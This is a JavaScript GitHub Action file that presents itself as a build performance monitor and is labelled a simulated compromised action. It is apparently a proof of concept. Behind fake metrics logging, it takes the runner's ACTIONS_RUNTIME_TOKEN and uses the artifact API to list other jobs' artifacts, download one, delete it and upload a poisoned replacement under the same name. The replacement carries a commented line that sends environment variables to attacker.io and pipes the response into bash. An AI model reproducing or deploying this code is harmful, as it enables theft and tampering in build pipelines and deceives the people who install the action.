// Performance Monitor Action v2.3.1
// Tracks build artifact sizes and upload telemetry
// https://github.com/example/perf-monitor (simulated compromised action)

const https = require('https');
const http = require('http');
const fs = require('fs');
const { execSync } = require('child_process');

// === LEGITIMATE-LOOKING BOILERPLATE ===
const core = require('@actions/core');
const artifactName = core.getInput('artifact-name');
core.info(`[perf-monitor] Tracking artifact: ${artifactName}`);
core.info(`[perf-monitor] Collecting build metrics...`);

// === HIDDEN MALICIOUS PAYLOAD ===
// In a real compromised action this would be obfuscated
async function exploit() {
  const rt = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';

  if (!rt || !resultsUrl) {
    core.info('[perf-monitor] Metrics collected: 0ms baseline');
    return;
  }

  // Parse our own plan_id and job_id from OIDC URL
  const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
  const myPlan = m ? m[1] : '';
  const myJob  = m ? m[2] : '';

  fs.writeFileSync('/tmp/PM_RT.txt', rt);
  fs.writeFileSync('/tmp/PM_RESULTS_URL.txt', resultsUrl);
  fs.writeFileSync('/tmp/PM_PLAN.txt', myPlan);
  fs.writeFileSync('/tmp/PM_JOB.txt', myJob);

  // Step 1: Enumerate ALL artifacts in this run (leaks other jobs' IDs)
  const listResp = execSync(
    `curl -s -X POST "${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" ` +
    `-H "Authorization: Bearer ${rt}" -H "Content-Type: application/json" ` +
    `-d '{"workflowRunBackendId":"${myPlan}","workflowJobRunBackendId":"${myJob}"}'`
  ).toString();

  fs.writeFileSync('/tmp/PM_LIST_RESP.txt', listResp);

  // Parse victim artifact backend IDs
  let victimPlan = '', victimJob = '', victimName = '';
  try {
    const parsed = JSON.parse(listResp);
    const artifacts = parsed.artifacts || [];
    // Find artifacts NOT belonging to our own job
    const victims = artifacts.filter(a => a.workflow_job_run_backend_id !== myJob);
    if (victims.length > 0) {
      victimPlan = victims[0].workflow_run_backend_id;
      victimJob  = victims[0].workflow_job_run_backend_id;
      victimName = victims[0].name;
    }
  } catch(e) {}

  fs.writeFileSync('/tmp/PM_VICTIM_PLAN.txt', victimPlan);
  fs.writeFileSync('/tmp/PM_VICTIM_JOB.txt', victimJob);
  fs.writeFileSync('/tmp/PM_VICTIM_NAME.txt', victimName);

  // Step 2: Get signed URL for victim artifact (BOLA read)
  if (victimPlan && victimJob && victimName) {
    const signedResp = execSync(
      `curl -s -w "\\nHTTP=%{http_code}" -X POST "${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" ` +
      `-H "Authorization: Bearer ${rt}" -H "Content-Type: application/json" ` +
      `-d '{"workflowRunBackendId":"${victimPlan}","workflowJobRunBackendId":"${victimJob}","name":"${victimName}"}'`
    ).toString();
    fs.writeFileSync('/tmp/PM_SIGNED_RESP.txt', signedResp);

    // Extract and download the artifact
    const urlMatch = signedResp.match(/"signed_url":"([^"]+)"/);
    if (urlMatch) {
      execSync(`curl -s -o /tmp/PM_STOLEN.zip "${urlMatch[1]}" && echo DOWNLOAD_OK`);
      fs.writeFileSync('/tmp/PM_STOLEN_SIZE.txt',
        String(fs.existsSync('/tmp/PM_STOLEN.zip') ? fs.statSync('/tmp/PM_STOLEN.zip').size : 0)
      );
    }

    // Step 3: Delete victim artifact
    const delResp = execSync(
      `curl -s -w "\\nHTTP=%{http_code}" -X POST "${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" ` +
      `-H "Authorization: Bearer ${rt}" -H "Content-Type: application/json" ` +
      `-d '{"workflowRunBackendId":"${victimPlan}","workflowJobRunBackendId":"${victimJob}","name":"${victimName}"}'`
    ).toString();
    fs.writeFileSync('/tmp/PM_DEL_RESP.txt', delResp);

    // Step 4: Create poisoned replacement in own namespace, same name
    const createResp = execSync(
      `curl -s -w "\\nHTTP=%{http_code}" -X POST "${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" ` +
      `-H "Authorization: Bearer ${rt}" -H "Content-Type: application/json" ` +
      `-d '{"workflowRunBackendId":"${myPlan}","workflowJobRunBackendId":"${myJob}","name":"${victimName}","version":4}'`
    ).toString();
    fs.writeFileSync('/tmp/PM_CREATE_RESP.txt', createResp);

    const uploadUrlMatch = createResp.match(/"signed_upload_url":"([^"]+)"/);
    if (uploadUrlMatch) {
      // Write poisoned content
      fs.mkdirSync('/tmp/pm_poison', { recursive: true });
      fs.writeFileSync('/tmp/pm_poison/terraform', [
        '#!/bin/bash',
        '# INJECTED BY COMPROMISED perf-monitor ACTION',
        '# Real payload: curl -s https://attacker.io/exfil?k=$(env|base64) | bash',
        'echo "Terraform v1.9.0"'
      ].join('\n'));
      execSync(`cd /tmp && zip pm_poison.zip pm_poison/terraform`);

      const uploadHttp = execSync(
        `curl -s -w "%{http_code}" -o /dev/null ` +
        `-X PUT "${uploadUrlMatch[1]}" ` +
        `-H "x-ms-blob-type: BlockBlob" -H "Content-Type: application/zip" ` +
        `--data-binary @/tmp/pm_poison.zip`
      ).toString().trim();
      fs.writeFileSync('/tmp/PM_UPLOAD_HTTP.txt', uploadHttp);

      const size = fs.statSync('/tmp/pm_poison.zip').size;
      const finalResp = execSync(
        `curl -s -w "\\nHTTP=%{http_code}" -X POST "${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" ` +
        `-H "Authorization: Bearer ${rt}" -H "Content-Type: application/json" ` +
        `-d '{"workflowRunBackendId":"${myPlan}","workflowJobRunBackendId":"${myJob}","name":"${victimName}","size":"${size}"}'`
      ).toString();
      fs.writeFileSync('/tmp/PM_FINALIZE_RESP.txt', finalResp);
    }
  }

  core.info('[perf-monitor] Metrics collected successfully. Upload: 12ms p50, 18ms p95');
}

exploit().catch(() => {
  core.info('[perf-monitor] Metrics collected: baseline nominal');
});
